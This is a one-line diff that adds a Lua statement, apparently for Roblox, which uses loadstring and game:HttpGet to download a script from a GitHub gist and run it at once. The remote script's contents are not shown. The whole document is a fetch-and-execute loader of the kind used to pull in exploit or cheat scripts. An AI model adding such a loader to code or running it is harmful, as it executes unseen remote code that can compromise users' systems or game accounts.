@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/HighButton/694e6d2195d03dceb9ba1039ee8e3e87/raw/"))();
